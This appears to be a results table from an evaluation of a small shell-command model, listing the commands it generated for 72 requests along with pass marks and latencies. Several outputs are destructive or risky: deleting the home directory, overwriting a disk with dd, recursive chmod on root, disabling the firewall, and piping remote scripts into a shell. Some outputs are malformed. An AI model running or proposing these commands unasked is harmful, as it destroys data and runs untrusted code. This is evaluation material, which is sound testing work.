# eval: llama-server / kitty-bash-0.5b (v3-fewshot)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 53/72 (74%)
- cold p50 115ms p95 255ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 128 | - | node -v && npm -v |
| u02 | ✗ | 117 | - | find . -type f -exec ls -s {} \; |
| u03 | ✓ | 157 | - | curl ifconfig.me |
| u04 | ✓ | 176 | - | lsof -i :3000 |
| u05 | ✓ | 76 | - | du -sh . |
| u06 | ✓ | 255 | - | find . -name "*.log" -mtime -1 |
| u07 | ✓ | 116 | - | ps aux | grep node |
| u08 | ✓ | 44 | - | git status |
| u09 | ✓ | 62 | - | brew install ripgrep |
| u10 | ✓ | 72 | - | mkdir projects && cd projects |
| u11 | ✓ | 139 | - | tar -czvf archive.tar.gz folder |
| u12 | ✓ | 101 | - | env | grep PATH |
| u13 | ✓ | 375 | - | lsof -i :8080 | awk '{print $2}' | xargs kill -9 |
| u14 | ✓ | 106 | - | tail -n 20 /var/log/syslog |
| u15 | ✓ | 75 | - | python3 --version |
| u16 | ✓ | 116 | - | brew update && brew outdated |
| u17 | ✓ | 94 | - | echo $SHELL |
| u18 | ✓ | 82 | - | git reset --soft HEAD~1 |
| u19 | ✗ | 202 | - | find ~ -type f -exec du -h {} + | sort -rh | head -n 5 |
| u20 | ✓ | 67 | - | free -m |
| u21 | ✗ | 155 | - | find . -type f -name "*.js" | xargs wc -l |
| u22 | ✗ | 49 | - | docker restart |
| u23 | ✓ | 161 | - | chmod +x script.sh && ./script.sh |
| u24 | ✓ | 116 | - | rg --no-ignore-case ""TODO"" |
| u25 | ✓ | 201 | - | curl -L -o downloads/file.zip https://example.com/file.zip |
| u26 | ✗ | 83 | - | sysctl hw.ncpu |
| u27 | ✓ | 158 | - | echo "export FOO=bar" >> ~/.zshrc |
| u28 | ✓ | 83 | - | rm -rf node_modules |
| u29 | ✓ | 95 | - | ss -tlnp |
| u30 | ✓ | 128 | - | unzip file.zip -d . |
| u31 | ✓ | 158 | - | tail -f /var/log/app.log |
| u32 | ✓ | 56 | - | uptime |
| u33 | ✗ | 153 | - | find . -type f -name ".zshrc" |
| u34 | ✓ | 90 | - | cat /etc/resolv.conf |
| u35 | ✓ | 79 | - | cp file.txt backup.txt |
| u36 | ✓ | 67 | - | mv old.txt new.txt |
| u37 | ✗ | 61 | - | du -h downloads |
| u38 | ✓ | 57 | - | npm list --global |
| u39 | ✓ | 211 | - | find . -type d | xargs -I {} sh -c 'cd "{}" && open .' |
| u40 | ✗ | 107 | - | sudo dnf --refresh install nodejs |
| a01 | ✓ | 97 | - | rm -rf $HOME |
| a02 | ✓ | 234 | - | sudo dd if=/dev/urandom of=/dev/sdb bs=4M count=1024 |
| a03 | ✓ | 104 | - | git push --force-with-lease origin main |
| a04 | ✗ | 139 | - | curl -s https://sketchy.example.com/install.sh | sh |
| a05 | ✗ | 77 | - | pkill -9 |
| a06 | ✗ | 104 | - | sudo chmod 777 everything in root |
| a07 | ✗ | 160 | - | echo "needs manual review" | tee /var/log/my_command.log |
| a08 | ✓ | 127 | - | curl -sL https://x.io/i | sh |
| a09 | ✓ | 154 | - | sudo chmod -R 755 / |
| a10 | ✓ | 213 | - | find /var/log -type f -mtime +30 -exec rm {} \; |
| a11 | ✗ | 189 | - | echo "*/5 * * * * /path/to/script.sh" | crontab |
| a12 | ✓ | 74 | - | git reset --hard HEAD |
| a13 | ✓ | 60 | - | brew uninstall node |
| a14 | ✓ | 73 | - | sudo ufw disable |
| a15 | ✓ | 219 | - | find . -type f -name "*.tmp" -exec rm {} \; |
| a16 | ✗ | 185 | - | { |
| a17 | ✓ | 81 | - | rm -rf ~/ |
| a18 | ✗ | 115 | - | echo -n "hunter2" | md5 |
| a19 | ✓ | 185 | - | echo 'export PATH=$PATH:/path/to/program' >> ~/.zshrc |
| a20 | ✗ | 89 | - | echo "needs manual review" |
| u41 | ✓ | 98 | - | find ~ -size +100M |
| u42 | ✓ | 90 | - | echo 'hello world' > my notes.txt |
| u43 | ✓ | 124 | - | git log -5 --pretty=format:"%h %s" |
| u44 | ✓ | 156 | - | curl -s https://example.com | cat |
| u45 | ✓ | 122 | - | find . -type f | wc -l |
| u46 | ✗ | 75 | - | ifconfig |
| u47 | ✓ | 89 | - | df -h |
| u48 | ✓ | 60 | - | who |
| a21 | ✗ | 275 | - | echo "0 0 * * * /bin/rm -rf /tmp" | crontab |
| a22 | ✓ | 274 | - | echo "127.0.0.1 $(pwd)/myhost" | sudo tee -a /etc/hosts |
| a23 | ✓ | 123 | - | find . -type f -exec rm {} \; |
| a24 | ✗ | 93 | - | curl https://x.io/i.sh | bash |
